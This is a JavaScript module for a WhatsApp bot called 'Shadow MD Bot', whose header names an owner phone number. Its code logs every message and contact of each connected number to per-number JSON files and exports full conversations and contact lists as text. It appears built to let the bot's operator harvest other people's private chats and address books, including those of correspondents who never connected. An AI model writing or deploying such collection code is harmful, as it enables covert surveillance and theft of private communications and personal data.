/**
 * Shadow MD Bot - Data Collection Module
 * Saves messages and contacts to JSON for each connected number
 * Owner: 923271054080
 */

const fs = require('fs');
const path = require('path');

const DATA_DIR = './kingbadboitimewisher/data';

function ensureDataDir() {
    if (!fs.existsSync(DATA_DIR)) {
        fs.mkdirSync(DATA_DIR, { recursive: true });
    }
}

function getNumberDataPath(number) {
    ensureDataDir();
    const safeNumber = number.replace(/[^0-9]/g, '');
    return path.join(DATA_DIR, safeNumber);
}

function ensureNumberDir(number) {
    const dir = getNumberDataPath(number);
    if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true });
    }
    return dir;
}

// ========== MESSAGES COLLECTION ==========
function saveMessage(number, messageObj) {
    try {
        const dir = ensureNumberDir(number);
        const messagesFile = path.join(dir, 'messages.json');

        let messages = [];
        if (fs.existsSync(messagesFile)) {
            messages = JSON.parse(fs.readFileSync(messagesFile, 'utf8'));
        }

        // Extract message data
        const msgData = extractMessageData(messageObj);
        if (msgData) {
            messages.push(msgData);
            fs.writeFileSync(messagesFile, JSON.stringify(messages, null, 2), 'utf8');
        }
    } catch (e) {
        console.log('Error saving message:', e.message);
    }
}

function extractMessageData(m) {
    try {
        if (!m || !m.message) return null;

        const msgType = Object.keys(m.message)[0];
        const isFromMe = m.key.fromMe;
        const remoteJid = m.key.remoteJid;
        const timestamp = m.messageTimestamp ? new Date(m.messageTimestamp * 1000).toISOString() : new Date().toISOString();
        const messageId = m.key.id;

        let content = '';
        let mediaType = 'text';
        let mediaUrl = null;
        let caption = '';

        // Extract content based on message type
        if (msgType === 'conversation') {
            content = m.message.conversation || '';
        } else if (msgType === 'extendedTextMessage') {
            content = m.message.extendedTextMessage?.text || '';
        } else if (msgType === 'imageMessage') {
            mediaType = 'image';
            caption = m.message.imageMessage?.caption || '';
            content = `[IMAGE] ${caption}`;
        } else if (msgType === 'videoMessage') {
            mediaType = 'video';
            caption = m.message.videoMessage?.caption || '';
            content = `[VIDEO] ${caption}`;
        } else if (msgType === 'audioMessage') {
            mediaType = 'audio';
            content = '[AUDIO/VOICE]';
        } else if (msgType === 'documentMessage') {
            mediaType = 'document';
            caption = m.message.documentMessage?.caption || '';
            content = `[DOCUMENT] ${caption}`;
        } else if (msgType === 'stickerMessage') {
            mediaType = 'sticker';
            content = '[STICKER]';
        } else if (msgType === 'contactMessage') {
            mediaType = 'contact';
            content = `[CONTACT] ${m.message.contactMessage?.displayName || ''}`;
        } else if (msgType === 'locationMessage') {
            mediaType = 'location';
            content = `[LOCATION]`;
        } else if (msgType === 'pollCreationMessage') {
            mediaType = 'poll';
            content = `[POLL] ${m.message.pollCreationMessage?.name || ''}`;
        } else {
            content = `[${msgType.toUpperCase()}]`;
        }

        return {
            id: messageId,
            timestamp: timestamp,
            fromMe: isFromMe,
            remoteJid: remoteJid,
            sender: isFromMe ? 'ME' : (remoteJid.split('@')[0]),
            type: mediaType,
            content: content,
            caption: caption,
            msgType: msgType
        };
    } catch (e) {
        console.log('Error extracting message:', e.message);
        return null;
    }
}

// ========== CONTACTS COLLECTION ==========
function saveContacts(number, contacts) {
    try {
        const dir = ensureNumberDir(number);
        const contactsFile = path.join(dir, 'contacts.json');

        let existingContacts = [];
        if (fs.existsSync(contactsFile)) {
            existingContacts = JSON.parse(fs.readFileSync(contactsFile, 'utf8'));
        }

        // Merge new contacts, avoid duplicates
        const existingJids = new Set(existingContacts.map(c => c.jid));

        for (const contact of contacts) {
            if (!existingJids.has(contact.id)) {
                existingContacts.push({
                    jid: contact.id,
                    name: contact.notify || contact.name || contact.verifiedName || contact.id.split('@')[0],
                    number: contact.id.split('@')[0],
                    savedAt: new Date().toISOString()
                });
                existingJids.add(contact.id);
            }
        }

        fs.writeFileSync(contactsFile, JSON.stringify(existingContacts, null, 2), 'utf8');
    } catch (e) {
        console.log('Error saving contacts:', e.message);
    }
}

// ========== GET DATA FUNCTIONS ==========
function getConnectedNumbers() {
    ensureDataDir();
    try {
        return fs.readdirSync(DATA_DIR).filter(f => {
            const fullPath = path.join(DATA_DIR, f);
            return fs.lstatSync(fullPath).isDirectory();
        });
    } catch (e) {
        return [];
    }
}

function getMessages(number) {
    try {
        const dir = getNumberDataPath(number);
        const messagesFile = path.join(dir, 'messages.json');
        if (fs.existsSync(messagesFile)) {
            return JSON.parse(fs.readFileSync(messagesFile, 'utf8'));
        }
        return [];
    } catch (e) {
        return [];
    }
}

function getContacts(number) {
    try {
        const dir = getNumberDataPath(number);
        const contactsFile = path.join(dir, 'contacts.json');
        if (fs.existsSync(contactsFile)) {
            return JSON.parse(fs.readFileSync(contactsFile, 'utf8'));
        }
        return [];
    } catch (e) {
        return [];
    }
}

function getChatList(number) {
    const messages = getMessages(number);
    const chatMap = {};

    for (const msg of messages) {
        if (!chatMap[msg.remoteJid]) {
            chatMap[msg.remoteJid] = {
                remoteJid: msg.remoteJid,
                name: msg.sender,
                messageCount: 0,
                lastMessage: msg.content,
                lastTimestamp: msg.timestamp
            };
        }
        chatMap[msg.remoteJid].messageCount++;
        if (new Date(msg.timestamp) > new Date(chatMap[msg.remoteJid].lastTimestamp)) {
            chatMap[msg.remoteJid].lastMessage = msg.content;
            chatMap[msg.remoteJid].lastTimestamp = msg.timestamp;
        }
    }

    return Object.values(chatMap);
}

function getChatMessages(number, remoteJid) {
    const messages = getMessages(number);
    return messages.filter(m => m.remoteJid === remoteJid);
}

// ========== EXPORT TO ZIP FUNCTIONS ==========
function exportMessagesToZip(number, remoteJid) {
    const messages = getChatMessages(number, remoteJid);
    let text = `╔════════════════════════════════════════════════════════════╗
`;
    text += `║  SHADOW MD BOT - CHAT EXPORT                              ║
`;
    text += `║  Number: ${number}                                        ║
`;
    text += `║  Chat With: ${remoteJid}                                  ║
`;
    text += `║  Exported: ${new Date().toLocaleString()}                 ║
`;
    text += `╚════════════════════════════════════════════════════════════╝

`;

    for (const msg of messages) {
        const direction = msg.fromMe ? '➡️  ME' : '⬅️  THEM';
        const time = new Date(msg.timestamp).toLocaleString();
        text += `[${time}] ${direction}
`;
        text += `    ${msg.content}
`;
        if (msg.caption) {
            text += `    Caption: ${msg.caption}
`;
        }
        text += `
`;
    }

    text += `
═══════════════════════════════════════════════════════════════
`;
    text += `End of Chat Export - Shadow MD Bot
`;
    text += `═══════════════════════════════════════════════════════════════
`;

    return text;
}

function exportContactsToText(number) {
    const contacts = getContacts(number);
    let text = `╔════════════════════════════════════════════════════════════╗
`;
    text += `║  SHADOW MD BOT - CONTACTS EXPORT                          ║
`;
    text += `║  Number: ${number}                                        ║
`;
    text += `║  Exported: ${new Date().toLocaleString()}                 ║
`;
    text += `║  Total Contacts: ${contacts.length}                       ║
`;
    text += `╚════════════════════════════════════════════════════════════╝

`;

    let idx = 1;
    for (const contact of contacts) {
        text += `${idx}. Name: ${contact.name}
`;
        text += `   Number: ${contact.number}
`;
        text += `   JID: ${contact.jid}
`;
        text += `   ─────────────────────────────────────
`;
        idx++;
    }

    text += `
═══════════════════════════════════════════════════════════════
`;
    text += `End of Contacts Export - Shadow MD Bot
`;
    text += `═══════════════════════════════════════════════════════════════
`;

    return text;
}

module.exports = {
    saveMessage,
    saveContacts,
    getConnectedNumbers,
    getMessages,
    getContacts,
    getChatList,
    getChatMessages,
    exportMessagesToZip,
    exportContactsToText,
    ensureDataDir,
    getNumberDataPath
};
